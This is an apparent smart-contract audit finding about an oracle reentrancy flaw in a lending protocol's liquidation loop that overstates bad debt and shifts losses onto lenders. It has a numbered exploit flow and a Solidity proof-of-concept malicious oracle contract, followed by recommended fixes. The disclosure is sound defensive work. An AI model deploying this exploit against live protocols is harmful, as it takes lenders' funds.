### Title
Oracle Reentrancy into `supplyCollateral` Corrupts Stale Local Bitmap in Liquidation Loop, Causing Excess Bad Debt Socialization - (File: src/Midnight.sol)

### Summary

In `Midnight.liquidate`, the collateral bitmap is copied into a local variable before the oracle-calling loop begins. Because `IOracle.price()` is an unconstrained external call, a market-creator-deployed malicious oracle can reenter `supplyCollateral` during that call, writing a new collateral bit into storage. The local bitmap never reflects this update, so the loop exits without accounting for the newly added collateral's value. The resulting `badDebt` figure is inflated, and the excess is socialized among lenders via `lossFactor`.

### Finding Description

**Root cause — stale local bitmap vs. live storage bitmap:**

At `src/Midnight.sol:606`, the bitmap is snapshotted into a stack variable:

```solidity
uint128 _collateralBitmap = _position.collateralBitmap;   // local copy
while (_collateralBitmap != 0) {
    uint256 i = UtilsLib.msb(_collateralBitmap);
    CollateralParams memory _collateralParam = market.collateralParams[i];
    uint256 price = IOracle(_collateralParam.oracle).price();  // ← external call
    ...
    _collateralBitmap = _collateralBitmap.clearBit(i);         // only local
}
``` [1](#0-0) 

The loop only ever clears bits from the local copy. Any bit written to `_position.collateralBitmap` in storage during the `price()` call is invisible to the loop.

**Reentrancy path — `supplyCollateral` writes to storage bitmap:**

```solidity
if (oldCollateral == 0 && assets > 0) {
    uint128 newCollateralBitmap = _position.collateralBitmap.setBit(collateralIndex);
    _position.collateralBitmap = newCollateralBitmap;   // ← storage write
    ...
}
``` [2](#0-1) 

`supplyCollateral` has no reentrancy guard and is callable by anyone authorized for `onBehalf`:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
``` [3](#0-2) 

**Exploit flow (all steps attacker-controlled):**

1. Attacker (market creator) deploys a market with at least two collateral params: index `i` with a `ReentrantOracle`, index `j > i` with a normal token. Both are valid market params (sorted, valid LLTV/maxLif).
2. Attacker (as borrower) supplies collateral `i`, borrows `D` units, becomes unhealthy (e.g., oracle price drops).
3. Attacker calls `setIsAuthorized(reentrantOracle, true, borrower)` — authorizes the oracle to supply on their behalf.
4. Attacker pre-funds `ReentrantOracle` with a large amount of token `j` and approves Midnight.
5. Anyone calls `liquidate(market, i, 0, 0, borrower, false, ...)` (seizedAssets=0, repaidUnits=0 — pure bad-debt realization path).
6. Loop starts: local `_collateralBitmap = {i}`.
7. Loop calls `ReentrantOracle.price()` for index `i`.
8. Oracle reenters: `supplyCollateral(market, j, largeAmount, borrower)` → storage bitmap becomes `{i, j}`, `_position.collateral[j] = largeAmount`.
9. Oracle returns `0` (or any price).
10. Loop reads `_position.collateral[i]` from storage (unchanged), computes `maxDebt += 0`, `badDebt` unchanged.
11. Loop clears bit `i` from local bitmap → local bitmap = `0`. Loop exits.
12. Bit `j` was never processed. `badDebt = D` (full original debt).
13. Correct `badDebt` with collateral `j` counted: `D − (largeAmount × price_j / ORACLE_PRICE_SCALE × WAD / maxLif_j)` — potentially 0.
14. `_position.debt -= D` (borrower's debt zeroed), `lossFactor` updated to slash lenders by `D` instead of the correct smaller amount.
15. Borrower retains collateral `j` (never seized, never counted).

**Why existing checks do not stop it:**

- `liquidationLocked` only blocks liquidation of the *seller* during `take` callbacks — it does not block `supplyCollateral` during oracle calls in `liquidate`. [4](#0-3) 
- The Certora formal verification explicitly excludes oracle reentrancy: specs model oracle calls as non-reentrant by assumption. [5](#0-4) 
- There is no `nonReentrant` modifier anywhere on `liquidate` or `supplyCollateral`.
- The `NotLiquidatable` check uses the stale `maxDebt` (computed without `j`), so it passes even if the position would be healthy with `j` counted. [4](#0-3) 

### Impact Explanation

Lenders are slashed via `lossFactor` by the full `badDebt = D` instead of the correct `badDebt = D − value(collateral_j)/maxLif_j`. The attacker (borrower) has their debt zeroed and retains collateral `j` — effectively extracting `value(collateral_j)/maxLif_j` worth of loan tokens from lenders at no cost. The invariant "bad debt realization must account for all active collateral" is violated: collateral `j` is active in storage at the time of realization but is excluded from the computation.

### Likelihood Explanation

**Preconditions:**
- Attacker must be able to create a market (permissionless via `touchMarket`).
- Attacker must be the borrower (or control the borrower account) to call `setIsAuthorized`.
- Attacker must fund the oracle with collateral `j` tokens.
- The position must be genuinely unhealthy (collateral `i` price must be low enough that `originalDebt > maxDebt` without `j`).

All preconditions are reachable by a single unprivileged actor. The attack is repeatable across any market the attacker creates and is not blocked by any gate (liquidator gate only restricts who can liquidate, not the oracle reentrancy path). The attacker can size collateral `j` to maximize lender loss up to the full debt amount.

### Recommendation

**Option 1 (preferred):** Re-read `_position.collateralBitmap` from storage after each oracle call, or snapshot all collateral amounts before any external call and use the snapshot throughout the loop.

**Option 2:** Use a transient-storage reentrancy lock (already available via `tstore`/`tload` as used for `liquidationLocked`) that blocks `supplyCollateral` (and `withdrawCollateral`) for the borrower's position while `liquidate` is executing.

**Option 3:** Move the `NotLiquidatable` check and bitmap snapshot to *after* all oracle calls complete, re-reading the bitmap from storage at that point to include any collateral added during reentrancy.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {IOracle} from "src/interfaces/IOracle.sol";
import {Midnight, Market, CollateralParams} from "src/Midnight.sol";
import {ERC20} from "test/mocks/ERC20.sol";

contract ReentrantOracle is IOracle {
    Midnight public midnight;
    Market public market;
    address public borrower;
    uint256 public reentrantIndex;   // j
    uint256 public reentrantAmount;
    bool public reentered;

    constructor(Midnight _midnight, address _borrower) {
        midnight = _midnight;
        borrower = _borrower;
    }

    function configure(Market memory _market, uint256 _idx, uint256 _amount) external {
        market = _market;
        reentrantIndex = _idx;
        reentrantAmount = _amount;
    }

    function price() external returns (uint256) {
        if (!reentered) {
            reentered = true;
            address token = market.collateralParams[reentrantIndex].token;
            ERC20(token).approve(address(midnight), reentrantAmount);
            midnight.supplyCollateral(market, reentrantIndex, reentrantAmount, borrower);
        }
        return 0; // collateral i is worthless
    }
}

contract TestOracleBitmapReentrancy is Test {
    Midnight midnight;
    ERC20 loanToken;
    ERC20 collateralTokenI;  // index i (lower address → lower index after sort)
    ERC20 collateralTokenJ;  // index j (higher address → higher index after sort)
    ReentrantOracle oracle;
    address borrower = address(0xB0);
    address lender  = address(0xA0);

    function setUp() public { /* deploy tokens, midnight, oracle, create market */ }

    function testExcessBadDebtViaOracleReentrancy() public {
        // 1. Create market: collateral[i]=tokenI/reentrantOracle, collateral[j]=tokenJ/legitimateOracle
        // 2. Lender supplies 1000 units of credit
        // 3. Borrower supplies collateralI, borrows 1000 units (becomes unhealthy when oracle returns 0)
        // 4. Borrower: setIsAuthorized(oracle, true)
        // 5. Fund oracle with large amount of tokenJ, oracle.configure(market, j, largeAmount)
        // 6. Call liquidate(market, i, 0, 0, borrower, false, ...)
        
        uint256 debtBefore = midnight.debtOf(id, borrower);
        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        
        midnight.liquidate(market, i, 0, 0, borrower, false, address(this), address(0), "");
        
        // Assert: full debt realized as bad debt (oracle returned 0, j not counted)
        assertEq(midnight.debtOf(id, borrower), 0, "debt zeroed");
        
        // Assert: borrower retains collateral j (never seized)
        assertGt(midnight.collateral(id, borrower, j), 0, "collateral j retained");
        
        // Assert: lenders slashed by full debtBefore instead of (debtBefore - value(j)/maxLif_j)
        midnight.updatePosition(market, lender);
        uint256 lenderCreditAfter = midnight.creditOf(id, lender);
        assertLt(lenderCreditAfter, lenderCreditBefore - correctBadDebt, "lenders over-slashed");
        
        // Assert: collateral j value was enough to cover some/all debt
        uint256 jValue = largeAmount * priceJ / ORACLE_PRICE_SCALE;
        assertGt(jValue, 0, "j had real value that should have reduced bad debt");
    }
}
```

**Expected assertions:** `debtOf(borrower) == 0`, `collateral(id, borrower, j) == largeAmount`, lender credit slashed by `debtBefore` instead of `debtBefore - jValue/maxLif_j`, confirming excess bad debt socialization.
